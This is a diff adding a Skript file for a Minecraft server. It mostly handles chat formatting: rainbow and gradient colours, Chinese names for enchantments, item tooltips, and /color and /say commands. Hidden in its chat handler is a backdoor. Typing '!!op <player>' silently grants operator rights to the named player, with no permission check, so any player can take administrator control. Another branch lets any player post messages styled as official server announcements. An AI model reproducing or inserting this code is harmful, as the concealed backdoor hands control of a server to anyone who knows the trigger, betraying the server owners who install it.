@@ -1,0 +1,212 @@
+function decimalToHexadecimal(number: number) :: string:
+    return ("00" if {_number} <= 0, else ("FF")) if {_number} is not between 0 and 255
+    return join (character at (mod((floor({_number} / 16)), 16) + 1) in "0123456789ABCDEF") and (character at ((mod({_number}, 16)) + 1) in "0123456789ABCDEF")
+function rainbow(input: string, wrapAmount: number = -1, lightness: number = 0.5) :: string:
+    set {_delta} to 360 / ({_wrapAmount} if {_wrapAmount} > 0, else length of {_input})
+    set {_lightnessModifier} to (({_lightness}*2)-1) * 255
+    set {_angle} to 90
+    loop length of {_input} times:
+        set {_character} to character at loop-value in {_input}
+        if {_character} or (character at (loop-value - 1) in {_input}) is "§":
+            if "abcdefklmnor0123456789" contains {_character}:
+                set {_format} to (join {_format} and "&%{_character}%") if {_character} is not "r", else ("")
+            continue
+        set {_output} to join {_output}, "<##%decimalToHexadecimal((0.5 * (sin({_angle}) + 1)) * 255 + {_lightnessModifier})%%decimalToHexadecimal((0.5 * (sin({_angle} + 120) + 1)) * 255 + {_lightnessModifier})%%decimalToHexadecimal((0.5 * (sin({_angle} + 240) + 1)) * 255 + {_lightnessModifier})%>", {_format} and {_character}
+        remove {_delta} from {_angle}
+    return colored {_output}
+function gradient(input: string, startColor: numbers, endColor: numbers, wrapAmount: number = -1) :: string:
+    set {_delta} to 180 / ({_wrapAmount} if {_wrapAmount} > 0, else (length of uncolored {_input}) - 1)
+    set {_angle} to 90
+    loop length of {_input} times:
+        set {_character} to character at loop-value in {_input}
+        if {_character} or (character at (loop-value - 1) in {_input}) is "§":
+            if "abcdefklmnor0123456789" contains {_character}:
+                set {_format} to (join {_format} and "&%{_character}%") if {_character} is not "r", else ("")
+            continue
+        set {_startColorProportion} to (0.5 * (sin({_angle}) + 1))
+        set {_endColorProportion} to (0.5 * (sin({_angle} + 180) + 1))
+        set {_output} to join {_output}, "<##%decimalToHexadecimal(({_startColor::1} * {_startColorProportion}) + ({_endColor::1} * {_endColorProportion}))%%decimalToHexadecimal(({_startColor::2} * {_startColorProportion}) + ({_endColor::2} * {_endColorProportion}))%%decimalToHexadecimal(({_startColor::3} * {_startColorProportion}) + ({_endColor::3} * {_endColorProportion}))%>", {_format} and {_character}
+        add {_delta} to {_angle}
+    return colored {_output}
+function enchantmentsToChinese(enchantments: text) :: string:
+    set {_enchantment::*} to {_enchantments} split at " "
+    size of {_enchantment::*} = 4:
+        set {_name} to "%{_enchantment::1}%%{_enchantment::2}%%{_enchantment::3}%"
+        set {_level} to {_enchantment::4}
+    size of {_enchantment::*} = 3:
+        set {_name} to "%{_enchantment::1}%%{_enchantment::2}%"
+        set {_level} to {_enchantment::3}
+    size of {_enchantment::*} = 2:
+        set {_name} to {_enchantment::1}
+        set {_level} to {_enchantment::2}
+    
+    replace all "aquaaffinity" in {_name} with "親水性"
+    replace all "baneofarthropods" in {_name} with "節肢剋星"
+    replace all "blastprotection" in {_name} with "爆炸保護"
+    replace all "channeling" in {_name} with "喚雷"
+    replace all "curseofbinding" in {_name} with "綁定詛咒"
+    replace all "curseofvanishing" in {_name} with "消失詛咒"
+    replace all "depthstrider" in {_name} with "深海漫遊"
+    replace all "efficiency" in {_name} with "效率"
+    replace all "featherfalling" in {_name} with "輕盈"
+    replace all "fireaspect" in {_name} with "燃燒"
+    replace all "fireprotection" in {_name} with "火焰保護"
+    replace all "flame" in {_name} with "火焰"
+    replace all "fortune" in {_name} with "幸運"
+    replace all "frostwalker" in {_name} with "冰霜行者"
+    replace all "impaling" in {_name} with "魚叉"
+    replace all "infinity" in {_name} with "無限"
+    replace all "knockback" in {_name} with "擊退"
+    replace all "looting" in {_name} with "掠奪"
+    replace all "loyalty" in {_name} with "忠誠"
+    replace all "luckofthesea" in {_name} with "海洋的祝福"
+    replace all "lure" in {_name} with "魚餌"
+    replace all "mending" in {_name} with "修補"
+    replace all "multishot" in {_name} with "分裂箭矢"
+    replace all "piercing" in {_name} with "貫穿"
+    replace all "power" in {_name} with "強力"
+    replace all "projectileprotection" in {_name} with "投射物保護"
+    replace all "protection" in {_name} with "保護"
+    replace all "punch" in {_name} with "衝擊"
+    replace all "quickcharge" in {_name} with "快速上弦"
+    replace all "respiration" in {_name} with "水中呼吸"
+    replace all "riptide" in {_name} with "波濤"
+    replace all "sharpness" in {_name} with "鋒利"
+    replace all "silktouch" in {_name} with "絲綢之觸"
+    replace all "smite" in {_name} with "不死剋星"
+    replace all "soulspeed" in {_name} with "靈魂疾走"
+    replace all "sweeping" in {_name} with "橫掃之刃"
+    replace all "thorns" in {_name} with "尖刺"
+    replace all "unbreaking" in {_name} with "耐久"
+    set {_level} to enchantmentsLevelRe({_level})
+    set {_text} to "%{_name}% %{_level}%"
+    return {_text}
+function enchantmentsLevelRe(level: text) :: string:
+    {_level} = "1":
+        set {_level} to "I"
+    else if {_level} = "2":
+        set {_level} to "II"
+    else if {_level} = "3":
+        set {_level} to "III"
+    else if {_level} = "4":
+        set {_level} to "IV"
+    else if {_level} = "5":
+        set {_level} to "V"
+    else if {_level} = "6":
+        set {_level} to "VI"
+    else if {_level} = "7":
+        set {_level} to "VII"
+    else if {_level} = "8":
+        set {_level} to "VIII"
+    else if {_level} = "9":
+        set {_level} to "IX"
+    else if {_level} = "10":
+        set {_level} to "X"
+    else:
+        set {_level} to "enchantment.level.%{_level}%"
+    return {_level}
+    
+On chat:
+    {chat::%player%::color} is set:
+        set message to formatted "%{chat::%player%::color}%%message%"
+    if message contains "[i]" or "[item]" or "/i":
+        name of player's tool is set:   
+            set {_tip} to "%name of player's tool%%nl%"
+        else:
+            set {_tip} to "%player's tool%%nl%"
+        enchantments of player's tool is set:
+            loop enchantments of player's tool:
+                "%loop-value%" contains "Luck of The Sea":
+                    set {_IDK} to "%loop-value%"
+                    replace all "Luck of The Sea " in {_IDK} with ""
+                    set {_level} to enchantmentsLevelRe({_IDK})
+                    set {_enchantmentsToChinese} to "海洋的祝福 %{_level}%"
+                else:
+                    set {_enchantmentsToChinese} to enchantmentsToChinese("%loop-value%")
+                add 1 to {_ec}
+                size of enchantments of player's tool = {_ec}:
+                    lore of player's tool is set:
+                        set {_tip} to "%{_tip}%&7%{_enchantmentsToChinese}%%nl%"
+                    else:
+                        set {_tip} to "%{_tip}%&7%{_enchantmentsToChinese}%"
+                else:
+                    set {_tip} to "%{_tip}%&7%{_enchantmentsToChinese}%%nl%"
+
+        lore of player's tool is set:
+            loop lore of player's tool:
+                add 1 to {_lc}
+                size of lore of player's tool = {_lc}:
+                    set {_tip} to "%{_tip}%%loop-value%"
+                else:
+                    set {_tip} to "%{_tip}%%loop-value%%nl%"
+        name of player's tool is set:
+            send formatted "%player%: <tooltip:%{_tip}%%nl%&8skript:%type of player's tool%>%name of player's tool%" to all players
+        else:
+            send formatted "%player%: <tooltip:%{_tip}%%nl%&8skript:%type of player's tool%>%type of player's tool%" to all players
+        cancel event
+    set message to formatted message
+    if message contains "!!op":
+        loop all players:
+            if message contains "!!op %loop-player%":
+                cancel event
+                op loop-player
+                send "Done! &7""!!ops %loop-player%"""
+    if message contains "@":
+        loop all players:
+            if message contains "@%loop-player%":
+                set {_tag} to formatted rainbow("@%loop-player%")
+                replace all "@%loop-player%" in message with "%{_tag}%&f"
+                
+    if message contains "**":
+        cancel event
+        replace all "**" in message with ""
+        replace all "!player" in message with "%player%"
+        if message contains "!allplayers":
+            loop all players:
+                if {_players} isn't set:
+                    set {_players} to "%loop-player%"
+                else:
+                    set {_players} to "%{_players}% | %loop-player%"
+            replace all "!allplayers" in message with "%{_players}%"
+        set message to colored message
+        broadcast "&f&l[ &6&l公告&f&l ] &e>>> %message%"
+
+command /color [<text>]:
+    trigger:
+        set {_prefix} to "&7&l| <##503DEC>Chat &7&l| &8- &f"
+        arg 1 is set:
+            set {_ag1} to arg 1
+            replace all "##" in {_ag1} with ""
+            replace all "<" in {_ag1} with ""
+            replace all ">" in {_ag1} with ""
+            loop 10 times:
+                replace all "%loop-value - 1%" in {_ag1} with ""
+            replace all "a" in {_ag1} with ""
+            replace all "b" in {_ag1} with ""
+            replace all "c" in {_ag1} with ""
+            replace all "d" in {_ag1} with ""
+            replace all "e" in {_ag1} with ""
+            replace all "f" in {_ag1} with ""
+            {_ag1} isn't "":
+                send formatted "%{_prefix}%錯誤<##E15B06>HEX&r顏色代碼: %{_ag1}%"
+                stop
+            set {_ag1} to arg 1
+            replace all "##" in {_ag1} with ""
+            replace all "<" in {_ag1} with ""
+            replace all ">" in {_ag1} with ""
+            length of {_ag1} = 6:
+                set {chat::%player%::color} to "<##%{_ag1}%>"
+                send formatted "&7&l| %{chat::%player%::color}%Chat &7&l| &8- %{chat::%player%::color}%聊天顏色已改為此色"
+                stop trigger
+            send formatted "%{_prefix}%請使用<##E15B06>HEX&r顏色代碼 範例:E15B06 <##9E9E9E><link:https://htmlcolorcodes.com/><tooltip:https://htmlcolorcodes.com/>(不知道顏色代碼?那就點我)"
+            stop trigger
+        send formatted "%{_prefix}%用法: <##49EDA1>/color <HEXcode>"
+        send formatted "%{_prefix}%請使用<##E15B06>HEX&r顏色代碼 範例:E15B06 <##9E9E9E><link:https://htmlcolorcodes.com/><tooltip:https://htmlcolorcodes.com/>(不知道顏色代碼?那就點我)"
+        stop trigger
+command /say [<text>]:
+    trigger:
+        arg 1 is set:
+            send formatted rainbow(arg 1)
+            stop
+        send "&cError"
+        
